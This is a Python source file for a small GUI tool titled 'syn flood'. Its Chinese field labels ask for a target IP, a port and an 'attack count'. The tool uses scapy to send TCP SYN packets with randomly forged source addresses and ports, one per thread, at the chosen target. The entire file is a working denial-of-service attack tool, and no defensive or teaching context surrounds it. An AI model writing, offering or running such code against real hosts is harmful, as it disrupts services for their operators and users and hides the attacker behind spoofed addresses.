#coding=utf-8
import socket, sys, random, threading
from scapy.all import *
from Tkinter import *
scapy.config.conf.iface = 'lo'
target = ''
port = 0
count = 0
class sendSYN(threading.Thread):
        global target, port
        def __init__(self):
                threading.Thread.__init__(self)
        def run(self):
                isrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
                isport = random.randint(1,65535)
                ip = IP(src = isrc,dst = target)
                syn = TCP(sport = isport, dport = port, flags = 'S')
                send(ip / syn, verbose = 0)
def click_button():
        global target, port, count
        target = e1.get()
        port = int(e2.get())
        count = int(e3.get())
        i = 0
        while i < count:
                i += 1
                sendSYN().start()
class App:
        def __init__(self, master):
                frame = Frame(master)
                frame.pack()
                label1 = Label(frame, text="IP地址:", width = 10, height = 3)
                label1.grid(row = 0, column = 0)
                label2 = Label(frame, text="端口号:", width = 10, height = 3)
                label2.grid(row = 1, column = 0)
                label3 = Label(frame, text="攻击次数:", width = 10, height = 3)
                label3.grid(row = 2, column = 0)
                global e1, e2, e3
                entry1 = Entry(frame, textvariable=e1, width = 15)
                entry1.grid(row = 0, column = 1)
                entry2 = Entry(frame, textvariable=e2, width = 15)
                entry2.grid(row = 1, column = 1)
                entry3 = Entry(frame, textvariable=e3, width = 15)
                entry3.grid(row = 2, column = 1)
                button1 = Button(frame, text='设定', command = click_button)
                button1.grid(row = 3, column = 1)
                button2 = Button(frame, text='退出', command = frame.quit)
                button2.grid(row = 3, column = 2)
root = Tk()
e1 = StringVar();
e2 = StringVar();
e3 = StringVar();
root.title('syn flood')
root.geometry('300x190')
app = App(root)
root.mainloop()